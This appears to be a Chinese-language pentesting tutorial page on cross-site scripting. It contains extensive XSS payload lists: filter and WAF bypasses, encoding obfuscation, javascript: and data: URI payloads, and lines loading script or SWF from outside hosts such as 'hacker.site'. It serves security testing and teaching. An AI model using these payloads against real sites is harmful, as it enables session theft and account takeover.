<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>XSS (Cross Site Scripting)</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="xss-跨站脚本攻击"><a class="header" href="#xss-跨站脚本攻击">XSS (跨站脚本攻击)</a></h1>
<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
<p>如果你对<strong>黑客职业</strong>感兴趣并想要攻克不可攻克的目标 - <strong>我们正在招聘！</strong>（<em>需要流利的波兰语书写和口语能力</em>）。</p>
<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
<h2 id="方法论"><a class="header" href="#方法论">方法论</a></h2>
<ol>
<li>检查<strong>你控制的任何值</strong>（<em>参数</em>，<em>路径</em>，<em>头部</em>？，<em>cookies</em>？）是否在HTML中被<strong>反射</strong>或被<strong>JS</strong>代码<strong>使用</strong>。</li>
<li><strong>找到反射/使用的上下文</strong>。</li>
<li>如果<strong>被反射</strong>：</li>
<li>检查<strong>你可以使用哪些符号</strong>，并根据此准备有效载荷：</li>
<li>在<strong>原始HTML</strong>中：</li>
<li>你能创建新的HTML标签吗？</li>
<li>你能使用支持<code>javascript:</code>协议的事件或属性吗？</li>
<li>你能绕过保护措施吗？</li>
<li>HTML内容是否被任何客户端JS引擎（<em>AngularJS</em>，<em>VueJS</em>，<em>Mavo</em>...）解释，你可以利用<a href="../client-side-template-injection-csti.html"><strong>客户端模板注入</strong></a>。</li>
<li>如果你不能创建执行JS代码的HTML标签，你能利用<a href="../dangling-markup-html-scriptless-injection/"><strong>悬挂标记 - 无脚本HTML注入</strong></a>吗？</li>
<li>在<strong>HTML标签</strong>内：</li>
<li>你能退出到原始HTML上下文吗？</li>
<li>你能创建新的事件/属性来执行JS代码吗？</li>
<li>你被困的属性是否支持JS执行？</li>
<li>你能绕过保护措施吗？</li>
<li>在<strong>JavaScript代码</strong>中：</li>
<li>你能逃离<code>&lt;script&gt;</code>标签吗？</li>
<li>你能逃离字符串并执行不同的JS代码吗？</li>
<li>你的输入是否在模板字面量``中？</li>
<li>你能绕过保护措施吗？</li>
<li>Javascript <strong>函数</strong>被<strong>执行</strong></li>
<li>你可以指明要执行的函数名称。例如：<code>?callback=alert(1)</code></li>
<li>如果<strong>被使用</strong>：</li>
<li>你可以利用<strong>DOM XSS</strong>，注意你的输入是如何被控制的，以及你的<strong>受控输入是否被任何接收器使用</strong>。</li>
</ol>
<p>在处理复杂的XSS时，你可能会发现了解以下内容很有趣：</p>
<p>{% content-ref url="debugging-client-side-js.md" %}
<a href="debugging-client-side-js.html">debugging-client-side-js.md</a>
{% endcontent-ref %}</p>
<h2 id="反射值"><a class="header" href="#反射值">反射值</a></h2>
<p>为了成功利用XSS，首先你需要找到一个<strong>由你控制的被反射的值</strong>在网页中。</p>
<ul>
<li><strong>中间反射</strong>：如果你发现一个参数的值甚至路径在网页中被反射，你可以利用<strong>反射XSS</strong>。</li>
<li><strong>存储并反射</strong>：如果你发现一个由你控制的值被保存在服务器中，并且每次访问页面时都会被反射，你可以利用<strong>存储XSS</strong>。</li>
<li><strong>通过JS访问</strong>：如果你发现一个由你控制的值正在通过JS访问，你可以利用<strong>DOM XSS</strong>。</li>
</ul>
<h2 id="上下文"><a class="header" href="#上下文">上下文</a></h2>
<p>在尝试利用XSS时，首先你需要知道<strong>你的输入被反射在哪里</strong>。根据上下文，你将能够以不同的方式执行任意JS代码。</p>
<h3 id="原始html"><a class="header" href="#原始html">原始HTML</a></h3>
<p>如果你的输入在<strong>原始HTML</strong>页面中被<strong>反射</strong>，你需要利用某些<strong>HTML标签</strong>来执行JS代码：<code>&lt;img , &lt;iframe , &lt;svg , &lt;script</code> ... 这些只是你可以使用的许多可能的HTML标签中的一些。<br />
此外，请记住<a href="../client-side-template-injection-csti.html">客户端模板注入</a>。</p>
<h3 id="在html标签属性内"><a class="header" href="#在html标签属性内">在HTML标签属性内</a></h3>
<p>如果你的输入在标签的属性值中被反射，你可以尝试：</p>
<ol>
<li><strong>逃离属性和标签</strong>（然后你将处于原始HTML中）并创建新的HTML标签进行利用：<code>"&gt;&lt;img [...]</code></li>
<li>如果你<strong>可以逃离属性但不能逃离标签</strong>（<code>&gt;</code>被编码或删除），根据标签的不同，你可以<strong>创建一个事件</strong>来执行JS代码：<code>" autofocus onfocus=alert(1) x="</code></li>
<li>如果你<strong>无法逃离属性</strong>（<code>"</code>被编码或删除），那么根据<strong>你的值被反射在哪个属性</strong>中<strong>如果你控制整个值或只是部分</strong>，你将能够利用它。例如，如果你控制一个事件如<code>onclick=</code>，你将能够使其在点击时执行任意代码。另一个有趣的<strong>例子</strong>是属性<code>href</code>，你可以使用<code>javascript:</code>协议来执行任意代码：<strong><code>href="javascript:alert(1)"</code></strong></li>
<li>如果你的输入在“<strong>不可利用的标签</strong>”中被反射，你可以尝试**<code>accesskey</code><strong>技巧来利用这个漏洞（你将需要某种社会工程来利用这一点）：</strong>`" accesskey="x" onclick="alert(1)" x="**</li>
</ol>
<p>如果你控制一个类名，Angular执行XSS的奇怪例子：</p>
<pre><code class="language-html">&lt;div ng-app&gt;
&lt;strong class="ng-init:constructor.constructor('alert(1)')()"&gt;aaa&lt;/strong&gt;
&lt;/div&gt;
</code></pre>
<h3 id="inside-javascript-code"><a class="header" href="#inside-javascript-code">Inside JavaScript code</a></h3>
<p>在这种情况下，您的输入在 HTML 页面中的 <strong><code>&lt;script&gt; [...] &lt;/script&gt;</code></strong> 标签之间、<code>.js</code> 文件中或使用 <strong><code>javascript:</code></strong> 协议的属性中被反射：</p>
<ul>
<li>如果在 <strong><code>&lt;script&gt; [...] &lt;/script&gt;</code></strong> 标签之间反射，即使您的输入在任何类型的引号内，您可以尝试注入 <code>&lt;/script&gt;</code> 并从此上下文中逃脱。这是有效的，因为 <strong>浏览器会首先解析 HTML 标签</strong> 然后解析内容，因此，它不会注意到您注入的 <code>&lt;/script&gt;</code> 标签在 HTML 代码中。</li>
<li>如果反射 <strong>在 JS 字符串内</strong>，并且最后的技巧不起作用，您需要 <strong>退出</strong> 字符串，<strong>执行</strong> 您的代码并 <strong>重构</strong> JS 代码（如果有任何错误，它将不会被执行）：</li>
<li><code>'-alert(1)-'</code></li>
<li><code>';-alert(1)//</code></li>
<li><code>\';alert(1)//</code></li>
<li>如果在模板字面量中反射，您可以使用 <code>${ ... }</code> 语法 <strong>嵌入 JS 表达式</strong>： <code>var greetings = `Hello, ${alert(1)}`</code></li>
<li><strong>Unicode 编码</strong> 可用于编写 <strong>有效的 javascript 代码</strong>：</li>
</ul>
<pre><code class="language-javascript">\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
</code></pre>
<h4 id="javascript-hoisting"><a class="header" href="#javascript-hoisting">Javascript Hoisting</a></h4>
<p>Javascript Hoisting 指的是<strong>在使用后声明函数、变量或类的机会，因此您可以利用未声明的变量或函数的 XSS 场景。</strong><br />
<strong>有关更多信息，请查看以下页面：</strong></p>
<p>{% content-ref url="js-hoisting.md" %}
<a href="js-hoisting.html">js-hoisting.md</a>
{% endcontent-ref %}</p>
<h3 id="javascript-function"><a class="header" href="#javascript-function">Javascript Function</a></h3>
<p>一些网页有端点<strong>接受作为参数的要执行的函数名称</strong>。在实际中常见的例子是类似于：<code>?callback=callbackFunc</code>。</p>
<p>找出用户直接提供的内容是否试图被执行的一个好方法是<strong>修改参数值</strong>（例如改为 'Vulnerable'），并在控制台中查找错误，例如：</p>
<p><img src="../../.gitbook/assets/image%20(711).png" alt="" /></p>
<p>如果它是脆弱的，您可以通过发送值**<code>?callback=alert(1)</code><strong>来</strong>触发一个警报**。然而，这些端点通常会<strong>验证内容</strong>，只允许字母、数字、点和下划线（<strong><code>[\w\._]</code></strong>）。</p>
<p>然而，即使有这个限制，仍然可以执行一些操作。这是因为您可以使用这些有效字符来<strong>访问 DOM 中的任何元素</strong>：</p>
<p><img src="../../.gitbook/assets/image%20(747).png" alt="" /></p>
<p>一些有用的函数：</p>
<pre><code>firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
</code></pre>
<p>您还可以尝试直接<strong>触发Javascript函数</strong>：<code>obj.sales.delOrders</code>。</p>
<p>然而，通常执行指定函数的端点是没有太多有趣DOM的端点，<strong>同一源中的其他页面</strong>将具有<strong>更有趣的DOM</strong>以执行更多操作。</p>
<p>因此，为了<strong>在不同DOM中利用此漏洞</strong>，开发了**同源方法执行（SOME）**利用：</p>
<p>{% content-ref url="some-same-origin-method-execution.md" %}
<a href="some-same-origin-method-execution.html">some-same-origin-method-execution.md</a>
{% endcontent-ref %}</p>
<h3 id="dom"><a class="header" href="#dom">DOM</a></h3>
<p>有<strong>JS代码</strong>不安全地使用一些<strong>由攻击者控制的数据</strong>，如<code>location.href</code>。攻击者可以利用这一点执行任意JS代码。</p>
<p>{% content-ref url="dom-xss.md" %}
<a href="dom-xss.html">dom-xss.md</a>
{% endcontent-ref %}</p>
<h3 id="通用xss"><a class="header" href="#通用xss"><strong>通用XSS</strong></a></h3>
<p>这种类型的XSS可以在<strong>任何地方</strong>找到。它们不仅依赖于对Web应用程序的客户端利用，还依赖于<strong>任何****上下文</strong>。这种<strong>任意JavaScript执行</strong>甚至可以被滥用以获得<strong>RCE</strong>，<strong>读取</strong>客户端和服务器中的<strong>任意****文件</strong>，等等。<br />
一些<strong>示例</strong>：</p>
<p>{% content-ref url="server-side-xss-dynamic-pdf.md" %}
<a href="server-side-xss-dynamic-pdf.html">server-side-xss-dynamic-pdf.md</a>
{% endcontent-ref %}</p>
<p>{% content-ref url="../../network-services-pentesting/pentesting-web/electron-desktop-apps/" %}
<a href="../../network-services-pentesting/pentesting-web/electron-desktop-apps/">electron-desktop-apps</a>
{% endcontent-ref %}</p>
<h2 id="waf绕过编码图像"><a class="header" href="#waf绕过编码图像">WAF绕过编码图像</a></h2>
<p><img src="../../.gitbook/assets/EauBb2EX0AERaNK%20(1).jpg" alt="来自 https://twitter.com/hackerscrolls/status/1273254212546281473?s=21" /></p>
<h2 id="在原始html中注入"><a class="header" href="#在原始html中注入">在原始HTML中注入</a></h2>
<p>当您的输入在<strong>HTML页面中被反射</strong>或您可以在此上下文中转义并注入HTML代码时，您需要做的<strong>第一</strong>件事是检查是否可以利用<code>&lt;</code>来创建新标签：只需尝试<strong>反射</strong>该<strong>字符</strong>并检查它是否被<strong>HTML编码</strong>或<strong>删除</strong>，或者是否<strong>未更改地反射</strong>。<strong>只有在最后一种情况下，您才能利用此情况</strong>。<br />
对于这些情况，还<strong>请记住</strong><a href="../client-side-template-injection-csti.html"><strong>客户端模板注入</strong></a><strong>。</strong><br />
&amp;#xNAN;<em><strong>注意：HTML注释可以使用****<strong><strong> </strong></strong><code>--&gt;</code>**** <strong><strong>或 ****</strong></strong><code>--!&gt;</code></strong></em></p>
<p>在这种情况下，如果未使用黑/白名单，您可以使用如下有效负载：</p>
<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1) /&gt;
&lt;svg onload=alert('XSS')&gt;
</code></pre>
<p>但是，如果使用了标签/属性的黑白名单，您需要<strong>暴力破解可以创建的标签</strong>。<br />
一旦您<strong>找到了允许的标签</strong>，您需要<strong>暴力破解有效标签内的属性/事件</strong>，以查看如何攻击该上下文。</p>
<h3 id="标签事件暴力破解"><a class="header" href="#标签事件暴力破解">标签/事件暴力破解</a></h3>
<p>访问 <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"><strong>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</strong></a> 并点击 <em><strong>复制标签到剪贴板</strong></em>。然后，使用 Burp intruder 发送所有标签，并检查是否有任何标签未被 WAF 识别为恶意。一旦您发现可以使用的标签，您可以使用有效标签<strong>暴力破解所有事件</strong>（在同一网页上点击 <em><strong>复制事件到剪贴板</strong></em> 并按照之前的程序进行）。</p>
<h3 id="自定义标签"><a class="header" href="#自定义标签">自定义标签</a></h3>
<p>如果您没有找到任何有效的 HTML 标签，您可以尝试<strong>创建一个自定义标签</strong>并使用 <code>onfocus</code> 属性执行 JS 代码。在 XSS 请求中，您需要以 <code>#</code> 结束 URL，以使页面<strong>聚焦于该对象</strong>并<strong>执行</strong>代码：</p>
<pre><code>/?search=&lt;xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1&gt;#x
</code></pre>
<h3 id="黑名单绕过"><a class="header" href="#黑名单绕过">黑名单绕过</a></h3>
<p>如果正在使用某种黑名单，您可以尝试通过一些简单的技巧来绕过它：</p>
<pre><code class="language-javascript">//Random capitalization
&lt;script&gt; --&gt; &lt;ScrIpT&gt;
&lt;img --&gt; &lt;ImG

//Double tag, in case just the first match is removed
&lt;script&gt;&lt;script&gt;
&lt;scr&lt;script&gt;ipt&gt;
&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
&lt;svg&gt;&lt;x&gt;&lt;script&gt;alert('1'&amp;#41&lt;/x&gt;

//Unexpected weird attributes
&lt;script x&gt;
&lt;script a="1234"&gt;
&lt;script ~~~&gt;
&lt;script/random&gt;alert(1)&lt;/script&gt;
&lt;script      ///Note the newline
&gt;alert(1)&lt;/script&gt;
&lt;scr\x00ipt&gt;alert(1)&lt;/scr\x00ipt&gt;

//Not closing tag, ending with " &lt;" or " //"
&lt;iframe SRC="javascript:alert('XSS');" &lt;
&lt;iframe SRC="javascript:alert('XSS');" //

//Extra open
&lt;&lt;script&gt;alert("XSS");//&lt;&lt;/script&gt;

//Just weird an unexpected, use your imagination
&lt;&lt;/script/script&gt;&lt;script&gt;
&lt;input type=image src onerror="prompt(1)"&gt;

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
&lt;&lt;TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
</code></pre>
<h3 id="长度绕过小型-xss"><a class="header" href="#长度绕过小型-xss">长度绕过（小型 XSS）</a></h3>
<p>{% hint style="info" %}
<strong>更多适用于不同环境的小型 XSS</strong> payload <a href="https://github.com/terjanq/Tiny-XSS-Payloads"><strong>可以在这里找到</strong></a> 和 <a href="https://tinyxss.terjanq.me"><strong>这里</strong></a>。
{% endhint %}</p>
<pre><code class="language-html">&lt;!-- Taken from the blog of Jorge Lajara --&gt;
&lt;svg/onload=alert``&gt;
&lt;script src=//aa.es&gt;
&lt;script src=//℡㏛.pw&gt;
</code></pre>
<p>最后一个是使用2个unicode字符，扩展为5个：telsr<br />
更多这些字符可以在<a href="https://www.unicode.org/charts/normalization/">这里</a>找到。<br />
要检查哪些字符被分解，请查看<a href="https://www.compart.com/en/unicode/U+2121">这里</a>。</p>
<h3 id="点击xss---点击劫持"><a class="header" href="#点击xss---点击劫持">点击XSS - 点击劫持</a></h3>
<p>如果为了利用该漏洞，你需要<strong>用户点击一个链接或一个带有预填充数据的表单</strong>，你可以尝试<a href="../clickjacking.html#xss-clickjacking"><strong>滥用点击劫持</strong></a>（如果页面存在漏洞）。</p>
<h3 id="不可能---悬挂标记"><a class="header" href="#不可能---悬挂标记">不可能 - 悬挂标记</a></h3>
<p>如果你认为<strong>创建一个带有属性以执行JS代码的HTML标签是不可能的</strong>，你应该检查<a href="../dangling-markup-html-scriptless-injection/"><strong>悬挂标记</strong></a>，因为你可以<strong>利用</strong>该漏洞<strong>而不</strong>执行<strong>JS</strong>代码。</p>
<h2 id="在html标签内注入"><a class="header" href="#在html标签内注入">在HTML标签内注入</a></h2>
<h3 id="在标签内从属性值中转义"><a class="header" href="#在标签内从属性值中转义">在标签内/从属性值中转义</a></h3>
<p>如果你在<strong>HTML标签内</strong>，你可以尝试的第一件事是<strong>从标签中转义</strong>，并使用<a href="./#injecting-inside-raw-html">上一节</a>中提到的一些技术来执行JS代码。<br />
如果你<strong>无法从标签中转义</strong>，你可以在标签内创建新的属性以尝试执行JS代码，例如使用一些有效载荷（<em>注意在这个例子中使用双引号从属性中转义，如果你的输入直接反映在标签内，你将不需要它们</em>）：</p>
<pre><code class="language-bash">" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block&gt;#x #Access http://site.com/?#x t
</code></pre>
<p><strong>样式事件</strong></p>
<pre><code class="language-python">&lt;p style="animation: x;" onanimationstart="alert()"&gt;XSS&lt;/p&gt;
&lt;p style="animation: x;" onanimationend="alert()"&gt;XSS&lt;/p&gt;

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
&lt;div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"&gt;&lt;/div&gt;
#moving your mouse anywhere over the page (0-click-ish):
&lt;div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"&gt;&lt;/div&gt;
</code></pre>
<h3 id="在属性内"><a class="header" href="#在属性内">在属性内</a></h3>
<p>即使你<strong>无法逃离属性</strong>（<code>"</code>被编码或删除），根据<strong>你的值反映在哪个属性</strong>上<strong>如果你控制所有值或只是部分值</strong>，你仍然能够利用它。<strong>例如</strong>，如果你控制一个事件如<code>onclick=</code>，你将能够使其在点击时执行任意代码。<br />
另一个有趣的<strong>例子</strong>是属性<code>href</code>，你可以使用<code>javascript:</code>协议来执行任意代码：<strong><code>href="javascript:alert(1)"</code></strong></p>
<p><strong>使用HTML编码/URL编码绕过事件</strong></p>
<p>HTML标签属性值内的<strong>HTML编码字符</strong>在运行时<strong>被解码</strong>。因此，像以下内容将是有效的（有效负载用粗体表示）：<code>&lt;a id="author" href="http://none" onclick="var tracker='http://foo?</code><strong><code>&amp;apos;-alert(1)-&amp;apos;</code></strong><code>';"&gt;返回&lt;/a&gt;</code></p>
<p>请注意<strong>任何类型的HTML编码都是有效的</strong>：</p>
<pre><code class="language-javascript">//HTML entities
&amp;apos;-alert(1)-&amp;apos;
//HTML hex without zeros
&amp;#x27-alert(1)-&amp;#x27
//HTML hex with zeros
&amp;#x00027-alert(1)-&amp;#x00027
//HTML dec without zeros
&amp;#39-alert(1)-&amp;#39
//HTML dec with zeros
&amp;#00039-alert(1)-&amp;#00039

&lt;a href="javascript:var a='&amp;apos;-alert(1)-&amp;apos;'"&gt;a&lt;/a&gt;
&lt;a href="&amp;#106;avascript:alert(2)"&gt;a&lt;/a&gt;
&lt;a href="jav&amp;#x61script:alert(3)"&gt;a&lt;/a&gt;
</code></pre>
<p><strong>注意，URL 编码也会有效：</strong></p>
<pre><code class="language-python">&lt;a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png"&gt;Click&lt;/a&gt;
</code></pre>
<p><strong>通过使用Unicode编码绕过内部事件</strong></p>
<pre><code class="language-javascript">//For some reason you can use unicode to encode "alert" but not "(1)"
&lt;img src onerror=\u0061\u006C\u0065\u0072\u0074(1) /&gt;
&lt;img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) /&gt;
</code></pre>
<h3 id="特殊协议在属性中"><a class="header" href="#特殊协议在属性中">特殊协议在属性中</a></h3>
<p>在某些地方，您可以使用协议 <strong><code>javascript:</code></strong> 或 <strong><code>data:</code></strong> 来 <strong>执行任意 JS 代码</strong>。有些将需要用户交互，有些则不需要。</p>
<pre><code class="language-javascript">javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&amp;colon;alert(1)
javascript&amp;#x003A;alert(1)
javascript&amp;#58;alert(1)
&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
DaTa:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,&lt;script&gt;alert(1)&lt;/script&gt;
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
</code></pre>
<p><strong>可以注入这些协议的地方</strong></p>
<p><strong>一般来说</strong> <code>javascript:</code> 协议可以 <strong>在任何接受 <code>href</code> 属性的标签中使用</strong>，并且在 <strong>大多数</strong> 接受 <strong><code>src</code> 属性的标签中使用</strong>（但不包括 <code>&lt;img&gt;</code>）</p>
<pre><code class="language-markup">&lt;a href="javascript:alert(1)"&gt;
&lt;a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="&gt;
&lt;form action="javascript:alert(1)"&gt;&lt;button&gt;send&lt;/button&gt;&lt;/form&gt;
&lt;form id=x&gt;&lt;/form&gt;&lt;button form="x" formaction="javascript:alert(1)"&gt;send&lt;/button&gt;
&lt;object data=javascript:alert(3)&gt;
&lt;iframe src=javascript:alert(2)&gt;
&lt;embed src=javascript:alert(1)&gt;

&lt;object data="data:text/html,&lt;script&gt;alert(5)&lt;/script&gt;"&gt;
&lt;embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/embed&gt;
&lt;embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="&gt;&lt;/embed&gt;
&lt;iframe src="data:text/html,&lt;script&gt;alert(5)&lt;/script&gt;"&gt;&lt;/iframe&gt;

//Special cases
&lt;object data="//hacker.site/xss.swf"&gt; .//https://github.com/evilcos/xss.swf
&lt;embed code="//hacker.site/xss.swf" allowscriptaccess=always&gt; //https://github.com/evilcos/xss.swf
&lt;iframe srcdoc="&lt;svg onload=alert(4);&gt;"&gt;
</code></pre>
<p><strong>其他混淆技巧</strong></p>
<p><em><strong>在这种情况下，上一节中的HTML编码和Unicode编码技巧也是有效的，因为您在一个属性内。</strong></em></p>
<pre><code class="language-javascript">&lt;a href="javascript:var a='&amp;apos;-alert(1)-&amp;apos;'"&gt;
</code></pre>
<p>此外，对于这些情况还有另一个<strong>不错的技巧</strong>：<strong>即使你在 <code>javascript:...</code> 中的输入被 URL 编码，它在执行之前会被 URL 解码。</strong> 所以，如果你需要使用<strong>单引号</strong>从<strong>字符串</strong>中<strong>逃逸</strong>，并且你看到<strong>它被 URL 编码</strong>，请记住<strong>这没关系，<strong>在</strong>执行</strong>时它会被<strong>解释</strong>为<strong>单引号</strong>。</p>
<pre><code class="language-javascript">&amp;apos;-alert(1)-&amp;apos;
%27-alert(1)-%27
&lt;iframe src=javascript:%61%6c%65%72%74%28%31%29&gt;&lt;/iframe&gt;
</code></pre>
<p>注意，如果你尝试以任何顺序同时使用 <code>URLencode + HTMLencode</code> 来编码 <strong>payload</strong>，它 <strong>不会</strong> <strong>工作</strong>，但你可以在 <strong>payload</strong> 中 <strong>混合使用</strong>。</p>
<p><strong>在 <code>javascript:</code> 中使用十六进制和八进制编码</strong></p>
